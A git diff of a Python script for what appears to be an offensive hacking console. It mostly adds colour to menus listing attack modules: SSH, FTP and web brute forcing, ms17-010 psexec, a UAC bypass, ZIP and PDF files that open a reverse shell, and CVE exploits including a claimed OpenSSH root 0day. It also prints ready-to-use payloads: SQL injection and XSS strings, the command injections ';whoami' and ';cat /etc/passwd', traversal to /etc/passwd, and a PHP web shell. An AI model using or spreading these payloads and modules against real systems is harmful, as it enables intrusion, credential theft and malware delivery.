@@ -166,63 +166,63 @@ search <exploit | windows | site | cve-exploits>
     elif scconsole == "search exploits":
         print("""
     Exploits                         When created?        Discrepstion 
-exploit/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
-exploit/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
-exploit/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
-exploit/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
-exploit/bypassuac-eventvwr           24/01/13 10:39       for execute the command with elevated privileges on the target.
-exploit/find-vulnerabilites-scan     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
-exploit/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
-exploit/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
-exploit/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
-exploit/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
-exploit/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
-exploit/ssh-version                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
-exploiit/ftp-login-test              24/01/19 11:15       for login on port 21 or 20 ftp port.
-exploit/http-login-test              24/01/19 12:01       for login on port 80 http port.
-exploit/reverse-shell                24/01/20 01:12       for get a reverse shell by sending a link.
-exploit/handler/handler              24/01/22 02:34       for listen on the target to open the exploit2.php.
-exploit/handler/listining            24/01/22 04:12       for listen on the target to open the exploit.php.
+""" + color.red + """exploit/ssh-login-test""" + color.white + """               24/01/11 05:54       for brute forcing ssh port.
+""" + color.red + """exploit/java-rhino""" + color.white + """                   24/01/12 02:45       for excuteshellcommand http port.
+""" + color.red + """exploit/tomcat-mgr-login""" + color.white + """             24/01/12 04:23       for brute force login pages.
+""" + color.red + """exploit/ms17-010-psexec""" + color.white + """              24/01/13 08:20       for brute force windows smb port.
+""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """           24/01/13 10:39       for execute the command with elevated privileges on the target.
+""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
+""" + color.red + """exploit/XSS""" + color.white + """                          24/01/14 09:35       for alert the XSS attack in html file.
+""" + color.red + """exploit/find_vulnerabilites_website""" + color.white + """  24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """exploit/find-vulnerabilites-website2""" + color.white + """ 24/01/14 12:31       for finding vulnerabilite with payload you specified.
+""" + color.red + """exploit/ZIP-exploit""" + color.white + """                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
+""" + color.red + """exploit/PDF-exploit""" + color.white + """                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
+""" + color.red + """exploit/ssh-version""" + color.white + """                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
+""" + color.red + """exploiit/ftp-login-test""" + color.white + """              24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """exploit/http-login-test""" + color.white + """              24/01/19 12:01       for login on port 80 http port.
+""" + color.red + """exploit/reverse-shell""" + color.white + """                24/01/20 01:12       for get a reverse shell by sending a link.
+""" + color.red + """exploit/handler/handler""" + color.white + """              24/01/22 02:34       for listen on the target to open the exploit2.php.
+""" + color.red + """exploit/handler/listining""" + color.white + """            24/01/22 04:12       for listen on the target to open the exploit.php.
 """)
     elif scconsole == "search exploit":
         print("""
     Exploits                         When created?        Discrepstion 
-exploit/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
-exploit/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
-exploit/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
-exploit/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
-exploit/bypassuac-eventvwr           24/01/13 10:39       for execute the command with elevated privileges on the target.
-exploit/find-vulnerabilites-scan     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
-exploit/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
-exploit/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
-exploit/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
-exploit/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
-exploit/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
-exploit/ssh-version                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
-exploiit/ftp-login-test              24/01/19 11:15       for login on port 21 or 20 ftp port.
-exploit/http-login-test              24/01/19 12:01       for login on port 80 http port.
-exploit/reverse-shell                24/01/20 01:12       for get a reverse shell by sending a link.
-exploit/handler/handler              24/01/22 02:34       for listen on the target to open the exploit2.php.
-exploit/handler/listining            24/01/22 04:12       for listen on the target to open the exploit.php.
+""" + color.red + """exploit/ssh-login-test""" + color.white + """               24/01/11 05:54       for brute forcing ssh port.
+""" + color.red + """exploit/java-rhino""" + color.white + """                   24/01/12 02:45       for excuteshellcommand http port.
+""" + color.red + """exploit/tomcat-mgr-login""" + color.white + """             24/01/12 04:23       for brute force login pages.
+""" + color.red + """exploit/ms17-010-psexec""" + color.white + """              24/01/13 08:20       for brute force windows smb port.
+""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """           24/01/13 10:39       for execute the command with elevated privileges on the target.
+""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
+""" + color.red + """exploit/XSS""" + color.white + """                          24/01/14 09:35       for alert the XSS attack in html file.
+""" + color.red + """exploit/find_vulnerabilites_website""" + color.white + """  24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """exploit/find-vulnerabilites-website2""" + color.white + """ 24/01/14 12:31       for finding vulnerabilite with payload you specified.
+""" + color.red + """exploit/ZIP-exploit""" + color.white + """                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
+""" + color.red + """exploit/PDF-exploit""" + color.white + """                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
+""" + color.red + """exploit/ssh-version""" + color.white + """                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
+""" + color.red + """exploiit/ftp-login-test""" + color.white + """              24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """exploit/http-login-test""" + color.white + """              24/01/19 12:01       for login on port 80 http port.
+""" + color.red + """exploit/reverse-shell""" + color.white + """                24/01/20 01:12       for get a reverse shell by sending a link.
+""" + color.red + """exploit/handler/handler""" + color.white + """              24/01/22 02:34       for listen on the target to open the exploit2.php.
+""" + color.red + """exploit/handler/listining""" + color.white + """            24/01/22 04:12       for listen on the target to open the exploit.php.
 """)
     elif scconsole == "search windows":
         print("""
     Exploits                         When created?        Discrepstion 
-windows/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
-windows/ftp-login-test               24/01/19 11:15       for login on port 21 or 20 ftp port.
-windows/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
-windows/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
-windows/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
+""" + color.red + """windows/PDF-exploit""" + color.white + """                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
+""" + color.red + """windows/ftp-login-test""" + color.white + """               24/01/19 11:15       for login on port 21 or 20 ftp port.
+""" + color.red + """windows/java-rhino""" + color.white + """                   24/01/12 02:45       for excuteshellcommand http port.
+""" + color.red + """windows/ms17-010-psexec""" + color.white + """              24/01/13 08:20       for brute force windows smb port.
+""" + color.red + """windows/ssh-login-test""" + color.white + """               24/01/11 05:54       for brute forcing ssh port.
 """)
     elif scconsole == "search site":
         print("""
     Exploits                         When created?        Discrepstion 
-site/XSS                             24/01/14 09:35       for alert the XSS attack in html file.
-site/find_vulnerabilites_website     24/01/14 11:40       for finding vulnerabilite in the target website.
-site/find-vulnerabilites-website2    24/01/14 12:31       for finding vulnerabilite with payload you specified.
-site/http-login-test                 24/01/19 12:01       for login on port 80 http port.
-site/ZIP-exploit                     24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
-site/tomcat-mgr-login                24/01/12 04:23       for brute force login pages.
+""" + color.red + """site/XSS""" + color.white + """                             24/01/14 09:35       for alert the XSS attack in html file.
+""" + color.red + """site/find_vulnerabilites_website""" + color.white + """     24/01/14 11:40       for finding vulnerabilite in the target website.
+""" + color.red + """site/find-vulnerabilites-website2""" + color.white + """    24/01/14 12:31       for finding vulnerabilite with payload you specified.
+""" + color.red + """site/http-login-test""" + color.white + """                 24/01/19 12:01       for login on port 80 http port.
+""" + color.red + """site/ZIP-exploit""" + color.white + """                     24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
+""" + color.red + """site/tomcat-mgr-login""" + color.white + """                24/01/12 04:23       for brute force login pages.
 """)
     elif scconsole == "search cve-exploits":
         print()
@@ -234,26 +234,28 @@ site/tomcat-mgr-login                24/01/12 04:23       for brute force login 
         print(color.red + "tools/cve-exploits/http-request_cve-2024-52558" + color.white + "         24/04/15 04:53       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.")
         print(color.red + "tools/cve-exploits/ipv6_cve-2024-38106" + color.white + "                 24/04/12 01:12       Windows IPv6 exploit.")
         print(color.red + "tools/cve-exploits/wordfence_cve-2024-8543" + color.white + "             25/01/09 12:39       This is an exploit for a Cross-Site Scripting (XSS) vulnerability in the Slider Comparison Image plugin for WordPress.")
+        print(color.red + "tools/cve-exploits/OpenSSH_5-3_32bit_86x_0day" + color.white + "          19/02/01 10:50       OpenSSH 5.3 32-bit x86 remote root 0day exploit.")
+        print(color.red + "tools/cve-exploits/OpenSSH_5-3p1_cve-2022-28123" + color.white + "        22/04/08 11:21       OpenSSH 5.3p1 cve-2022-28123 exploit.")
         print()
         print("You can't run these exploits from here, you need to run them from ",os.getcwd(),"/tools/cve-exploits/")
         print()
     elif scconsole == "show payloads":
         print("""
-' OR 1=1--   ---> SQL Injection payload.
+""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.
 
-' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.
+""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.
 
-<script>alert('XSS')</script>  ---> cross site XSS alert payload.
+""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.
 
-<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.
 
-;whoami  ---> remote code execute whoami payload.
+""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.
 
-;cat /etc/passwd  ---> remote code execute cat payload.
+""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
 
-../../../../etc/passwd  ---> directory traversal etc/passwd payload.
+""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
 
-<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
+""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.
 """)
     elif scconsole == "use exploit/ssh-login-test":
         time.sleep(0.5)
